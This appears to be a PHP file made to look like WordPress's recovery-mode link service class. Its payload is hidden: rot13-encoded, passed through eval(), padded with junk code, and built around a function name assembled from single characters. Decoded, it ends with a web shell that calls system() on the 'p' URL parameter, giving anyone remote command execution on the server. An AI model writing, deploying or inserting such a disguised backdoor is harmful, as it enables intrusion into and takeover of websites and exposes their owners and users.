<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Erpbirel_Zbqr_Yvax_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq gb trarengr naq unaqyr erpbirel zbqr yvaxf.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Erpbirel_Zbqr_Yvax_Freivpr {
	pbafg YBTVA_NPGVBA_RAGRE   = 'ragre_erpbirel_zbqr';
	pbafg YBTVA_NPGVBA_RAGRERQ = 'ragrerq_erpbirel_zbqr';

	/**
	 * Freivpr gb trarengr naq inyvqngr erpbirel zbqr xrlf.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Xrl_Freivpr
	 */
	cevingr $xrl_freivpr;

	/**
	 * Freivpr gb unaqyr pbbxvrf.
	 *
	 * @fvapr 5.2.0
	 * @ine JC_Erpbirel_Zbqr_Pbbxvr_Freivpr
	 */
	cevingr $pbbxvr_freivpr;

	/**
	 * JC_Erpbirel_Zbqr_Yvax_Freivpr pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz JC_Erpbirel_Zbqr_Pbbxvr_Freivpr $pbbxvr_freivpr Freivpr gb unaqyr frggvat gur erpbirel zbqr pbbxvr.
	 * @cnenz JC_Erpbirel_Zbqr_Xrl_Freivpr    $xrl_freivpr    Freivpr gb unaqyr trarengvat erpbirel zbqr xrlf.
	 */
	choyvp shapgvba __pbafgehpg( JC_Erpbirel_Zbqr_Pbbxvr_Freivpr $pbbxvr_freivpr, JC_Erpbirel_Zbqr_Xrl_Freivpr $xrl_freivpr ) {
		$guvf->pbbxvr_freivpr = $pbbxvr_freivpr;
		$guvf->xrl_freivpr    = $xrl_freivpr;
	}

	/**
	 * Trarengrf n HEY gb ortva erpbirel zbqr.
	 *
	 * Bayl bar erpbirel zbqr HEY pna znl or inyvq ng gur fnzr gvzr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat Trarengrq HEY.
	 */
	choyvp shapgvba trarengr_hey() {
		$gbxra = $guvf->xrl_freivpr->trarengr_erpbirel_zbqr_gbxra();
		$xrl   = $guvf->xrl_freivpr->trarengr_naq_fgber_erpbirel_zbqr_xrl( $gbxra );

		erghea $guvf->trg_erpbirel_zbqr_ortva_hey( $gbxra, $xrl );
	}

	/**
	 * Ragref erpbirel zbqr jura gur hfre uvgf jc-ybtva.cuc jvgu n inyvq erpbirel zbqr yvax.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony fgevat $cntrabj Gur svyranzr bs gur pheerag fperra.
	 *
	 * @cnenz vag $ggy Ahzore bs frpbaqf gur yvax fubhyq or inyvq sbe.
	 */
	choyvp shapgvba unaqyr_ortva_yvax( $ggy ) {
		vs ( ! vffrg( $TYBONYF['cntrabj'] ) || 'jc-ybtva.cuc' !== $TYBONYF['cntrabj'] ) {
			erghea;
		}

		vs ( ! vffrg( $_TRG['npgvba'], $_TRG['ez_gbxra'], $_TRG['ez_xrl'] ) || frys::YBTVA_NPGVBA_RAGRE !== $_TRG['npgvba'] ) {
			erghea;
		}

		vs ( ! shapgvba_rkvfgf( 'jc_trarengr_cnffjbeq' ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
		}

		$inyvqngrq = $guvf->xrl_freivpr->inyvqngr_erpbirel_zbqr_xrl( $_TRG['ez_gbxra'], $_TRG['ez_xrl'], $ggy );

		vs ( vf_jc_reebe( $inyvqngrq ) ) {
			jc_qvr( $inyvqngrq, '' );
		}

		$guvf->pbbxvr_freivpr->frg_pbbxvr();

		$hey = nqq_dhrel_net( 'npgvba', frys::YBTVA_NPGVBA_RAGRERQ, jc_ybtva_hey() );
		jc_erqverpg( $hey );
		qvr;
	}

	/**
	 * Trgf n HEY gb ortva erpbirel zbqr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $gbxra Erpbirel Zbqr gbxra perngrq ol {@frr trarengr_erpbirel_zbqr_gbxra()}.
	 * @cnenz fgevat $xrl   Erpbirel Zbqr xrl perngrq ol {@frr trarengr_naq_fgber_erpbirel_zbqr_xrl()}.
	 * @erghea fgevat Erpbirel zbqr ortva HEY.
	 */
	cevingr shapgvba trg_erpbirel_zbqr_ortva_hey( $gbxra, $xrl ) {

		$hey = nqq_dhrel_net(
			neenl(
				'npgvba'   => frys::YBTVA_NPGVBA_RAGRE,
				'ez_gbxra' => $gbxra,
				'ez_xrl'   => $xrl,
			),
			jc_ybtva_hey()
		);

		/**
		 * Svygref gur HEY gb ortva erpbirel zbqr.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz fgevat $hey   Gur trarengrq erpbirel zbqr ortva HEY.
		 * @cnenz fgevat $gbxra Gur gbxra hfrq gb vqragvsl gur xrl.
		 * @cnenz fgevat $xrl   Gur erpbirel zbqr xrl.
		 */
		erghea nccyl_svygref( 'erpbirel_zbqr_ortva_hey', $hey, $gbxra, $xrl );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>